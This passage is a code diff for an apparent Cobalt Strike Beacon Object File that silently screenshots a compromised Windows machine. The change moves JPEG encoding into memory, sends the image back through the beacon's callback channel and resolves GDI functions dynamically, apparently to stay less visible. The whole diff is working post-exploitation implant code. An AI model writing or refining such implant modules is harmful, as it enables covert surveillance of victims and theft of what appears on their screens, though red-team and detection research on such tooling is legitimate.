+    unsigned char* memory;
+};
+
+void memory_destination_init(j_compress_ptr cinfo)
+{
+    auto* dest = (jpeg_memory_destination*)cinfo->dest;
+    dest->pub.free_in_buffer = dest->capacity;
+    dest->pub.next_output_byte = dest->memory;
+}
+
+boolean memory_destination_extend_buffer(j_compress_ptr cinfo)
+{
+    auto* dest = (jpeg_memory_destination*)cinfo->dest;
+    dest->memory = (unsigned char*)realloc(dest->memory, dest->capacity * 2);
+    if (!dest->memory) {
+        return false;
+    }
+    dest->pub.next_output_byte = dest->memory + dest->capacity;
+    dest->pub.free_in_buffer = dest->capacity;
+    dest->capacity *= 2;
+
+    return true;
+}
+
+void memory_destination_terminate(j_compress_ptr cinfo)
+{
+}
+
+unsigned char* memory_destination_get(j_compress_ptr cinfo, size_t* size)
+{
+    auto* dest = (jpeg_memory_destination*)cinfo->dest;
+    *size = dest->capacity - dest->pub.free_in_buffer;
+    return dest->memory;
+}
+
+bool jepg_memory_dest(j_compress_ptr cinfo)
+{
+    cinfo->dest = (jpeg_destination_mgr*)(*cinfo->mem->alloc_small) ((j_common_ptr)cinfo, JPOOL_PERMANENT,
+        sizeof(jpeg_memory_destination));
+    auto* dest = (jpeg_memory_destination*)cinfo->dest;
+    dest->capacity = 128 * 1024;
+    dest->memory = (unsigned char*)malloc(dest->capacity);
+    if (!dest->memory) {
+        return false;
+    }
+    dest->pub.init_destination = memory_destination_init;
+    dest->pub.empty_output_buffer = memory_destination_extend_buffer;
+    dest->pub.term_destination = memory_destination_terminate;
+    return true;
+}
+
+BOOL bmp2jpeg(uint8_t* bmp_bytes, size_t bmp_size, int width, int height, int quality, void** jpeg_memory, size_t* jpeg_size)
 {
     struct jpeg_compress_struct cinfo;
     struct jpeg_error_mgr jerr;
-    FILE * out_jpg_file;
     JSAMPROW row_pointer[1];
     int row_stride;
 
-    if ((out_jpg_file = fopen(jpg_path, "wb")) == NULL) {
-        BeaconPrintf(CALLBACK_ERROR, "can't open jpg %s", jpg_path);
-        return FALSE;
-    }
-
     cinfo.err = jpeg_std_error(&jerr);
     jpeg_create_compress(&cinfo);
-    jpeg_stdio_dest(&cinfo, out_jpg_file);
+    if (!jepg_memory_dest(&cinfo)) {
+        return false;
+    }
 
     cinfo.image_width = width;
     cinfo.image_height = height;
@@ -8406,7 +8013,8 @@ BOOL bmp2jpeg(const char* jpg_path, uint8_t* bmp_bytes, size_t bmp_size, int wid
     }
 
     jpeg_finish_compress(&cinfo);
-    fclose(out_jpg_file);
+    *jpeg_size = 0;
+    *jpeg_memory = memory_destination_get(&cinfo, jpeg_size);
     jpeg_destroy_compress(&cinfo);
 
     return TRUE;
@@ -8414,13 +8022,13 @@ BOOL bmp2jpeg(const char* jpg_path, uint8_t* bmp_bytes, size_t bmp_size, int wid
 
 int get_screen_size(HDC dc, DWORD* width, DWORD* height)
 {
-    BITMAP all_desktops;
-    HGDIOBJ bitmap = GetCurrentObject(dc, OBJ_BITMAP);
-    GetObjectW(bitmap, sizeof(BITMAP), &all_desktops);
+    BITMAP all_desktops{};
+    HGDIOBJ bitmap = functions.GetCurrentObject(dc, OBJ_BITMAP);
+    functions.GetObjectW(bitmap, sizeof(BITMAP), &all_desktops);
 
     *width = all_desktops.bmWidth;
     *height = all_desktops.bmHeight;
-    DeleteObject(bitmap);
+    functions.DeleteObject(bitmap);
     return 1;
 }
 
@@ -8461,42 +8069,9 @@ void post_screenshot(void* data, int length)
     BeaconFormatFree(&fmt);
 }
 
-void upload_screenshot(const char* path)
-{
-    char* data;
-    int length;
-    FILE* img;
-
-    img = fopen(path, "rb");
-    if (!img) {
-        goto _END;
-    }
-
-    fseek(img, 0, SEEK_END);
-    length = ftell(img);
-    fseek(img, 0, SEEK_SET);
-    if (length == 0) {
-        goto _END;
-    }
-
-    data = malloc(length);
-    if (!data) {
-        goto _END;
-    }
-
-    fread(data, 1, length, img);
-    post_screenshot(data, length);
-
-_END:
-    if (img) {
-        fclose(img);
-        DeleteFileA(path);
-    }
-    if (data)
-        free(data);
-}
-
 #endif
+
+#if BOF_TEST_MODE
 
 int get_temp_path(char* buf, int length)
 {
@@ -8508,12 +8083,14 @@ int get_temp_path(char* buf, int length)
         name[i] = map[(rand() % 36)];
     }
     name[17] = 0;
-    length = ExpandEnvironmentStringsA(name, buf, length);
+    length = functions.ExpandEnvironmentStringsA(name, buf, length);
     memset(name, 0, sizeof(name));
     return length;
 }
 
-void take_screenshot(const char* path, int quality)
+#endif
+
+void take_screenshot(int quality, const char* path = nullptr)
 {
     BITMAPINFO info;
     HBITMAP bitmap = NULL;
@@ -8521,21 +8098,22 @@ void take_screenshot(const char* path, int quality)
     DWORD width = 0, height = 0;
     uint8_t *bits = NULL;
     DWORD cbits = 0;
-    char buf[256];
+    void* jpeg_memory{};
+    size_t jpeg_size = 0;
 
     int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
     int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
 
     memset(&info, 0, sizeof(BITMAPINFO));
 
-    dc = GetDC(NULL);
+    dc = functions.GetDC(NULL);
     if (!dc) {
         BeaconPrintf(CALLBACK_ERROR, "could not get DC: %lu", GetLastError());
         return;
     }
 
-    if (!get_screen_size(dc, &width, &height)) {
-        BeaconPrintf(CALLBACK_ERROR, "could not get size of screen: %lu", GetLastError());
+    if (!get_screen_size(dc, &width, &height) || width == 0 || height > 100000) {
+        BeaconPrintf(CALLBACK_ERROR, "could not get size of screen (screen may be locked)");
         goto _END;
     }
 
@@ -8550,38 +8128,72 @@ void take_screenshot(const char* path, int quality)
 
     cbits = (((24 * width + 31)&~31) / 8) * height;
 
-    mem_dc = CreateCompatibleDC(dc);
-    bitmap = CreateDIBSection(dc, &info, DIB_RGB_COLORS, (VOID **)&bits, NULL, 0);
-    SelectObject(mem_dc, bitmap);
-    BitBlt(mem_dc, 0, 0, width, height, dc, x, y, SRCCOPY);
+    mem_dc = functions.CreateCompatibleDC(dc);
+    bitmap = functions.CreateDIBSection(dc, &info, DIB_RGB_COLORS, (VOID **)&bits, NULL, 0);
+    functions.SelectObject(mem_dc, bitmap);
+    functions.BitBlt(mem_dc, 0, 0, width, height, dc, x, y, SRCCOPY);
 
     if (!bits) {
         BeaconPrintf(CALLBACK_ERROR, "bits is nullptr: %lu", GetLastError());
         goto _END;
     }
 
-    if (path == NULL) {
-        if (get_temp_path(buf, 256) == 0) {
-            BeaconPrintf(CALLBACK_ERROR, "could not get temp path: %lu", GetLastError());
-        }
-        path = buf;
-    }
-
-    if (bmp2jpeg(path, bits, cbits, width, height, quality)) {
+    if (bmp2jpeg(bits, cbits, width, height, quality, &jpeg_memory, &jpeg_size) && jpeg_memory && jpeg_size) {
 #if BOF_TEST_MODE
-        printf("screenshot image saved to %s\n", path);
+        char buf[256];
+        if (path == NULL) {
+            if (get_temp_path(buf, 256) == 0) {
+                BeaconPrintf(CALLBACK_ERROR, "could not get temp path: %lu", GetLastError());
+            }
+            path = buf;
+        }
+
+        auto* fp = fopen(path, "wb");
+        if (fp) {
+            fwrite(jpeg_memory, 1, jpeg_size, fp);
+            fclose(fp);
+            printf("screenshot image saved to %s\n", path);
+        }
+        else {
+            printf("[-] could not open %s for writing\n", path);
+        }
 #else
-        upload_screenshot(path);
+        post_screenshot(jpeg_memory, jpeg_size);
 #endif
+        free(jpeg_memory);
     }
 
 _END:
     if (mem_dc)
-        DeleteDC(mem_dc);
+        functions.DeleteDC(mem_dc);
     if (dc)
-        ReleaseDC(NULL, dc);
+        functions.ReleaseDC(NULL, dc);
     if (bitmap)
-        DeleteObject(bitmap);
+        functions.DeleteObject(bitmap);
+}
+
+bool init_functions()
+{
+    auto gdi32 = LoadLibraryA("gdi32");
+    auto krn32 = LoadLibraryA("kernel32");
+    auto usr32 = LoadLibraryA("user32");
+    if (!gdi32 || !krn32 || !usr32) {
+        return false;
+    }
+
+    functions.CreateCompatibleDC = (decltype(CreateCompatibleDC)*)GetProcAddress(gdi32, "CreateCompatibleDC");
+    functions.CreateCompatibleDC = (decltype(CreateCompatibleDC)*)GetProcAddress(gdi32, "CreateCompatibleDC");
+    functions.CreateDIBSection = (decltype(CreateDIBSection)*)GetProcAddress(gdi32, "CreateDIBSection");
+    functions.SelectObject = (decltype(SelectObject)*)GetProcAddress(gdi32, "SelectObject");
+    functions.BitBlt = (decltype(BitBlt)*)GetProcAddress(gdi32, "BitBlt");
+    functions.DeleteDC = (decltype(DeleteDC)*)GetProcAddress(gdi32, "DeleteDC");
+    functions.GetDC = (decltype(GetDC)*)GetProcAddress(usr32, "GetDC");
+    functions.ReleaseDC = (decltype(ReleaseDC)*)GetProcAddress(usr32, "ReleaseDC");
+    functions.DeleteObject = (decltype(DeleteObject)*)GetProcAddress(gdi32, "DeleteObject");
+    functions.GetCurrentObject = (decltype(GetCurrentObject)*)GetProcAddress(gdi32, "GetCurrentObject");
+    functions.GetObjectW = (decltype(GetObjectW)*)GetProcAddress(gdi32, "GetObjectW");
+    functions.ExpandEnvironmentStringsA = (decltype(ExpandEnvironmentStringsA)*)GetProcAddress(krn32, "ExpandEnvironmentStringsA");
+    return (functions.CreateCompatibleDC && functions.CreateDIBSection && functions.SelectObject && functions.BitBlt && functions.DeleteDC && functions.ReleaseDC && functions.DeleteObject && functions.GetCurrentObject && functions.GetObjectW && functions.ExpandEnvironmentStringsA);
 }
 
 #if BOF_TEST_MODE
@@ -8590,26 +8202,33 @@ int main(int argc, char** argv)
     const char* save_to = NULL;
     int quality = 200;
 
+    if (!init_functions()) {
+        BeaconPrintf(CALLBACK_ERROR, "failed to init functions");
+        return 1;
+    }
+
     if (argc > 1) {
         save_to = argv[1];
     }
     if (argc > 2) {
         quality = atoi(argv[2]);
     }
-    take_screenshot(save_to, quality);
+    take_screenshot(quality, save_to);
 }
 #else
-void go(char* arg, int alen)
+extern "C" void go(char* arg, int alen)
 {
-    datap p;
-    int quality = atoi(arg);
+    if (!init_functions()) {
+        BeaconPrintf(CALLBACK_ERROR, "failed to init functions");
+        return;
+    }
 
-    if (quality < 10 || quality > 100) {
+    int quality = atoi(arg);
+    quality *= 2;
+    if (quality < 10 || quality > 200) {
         quality = 50;
     }
 
-    //BeaconDataParse(&p, arg, alen);
-    //quality = BeaconDataInt(&p);
-    take_screenshot(NULL, quality);
+    take_screenshot(quality);
 }
 #endif
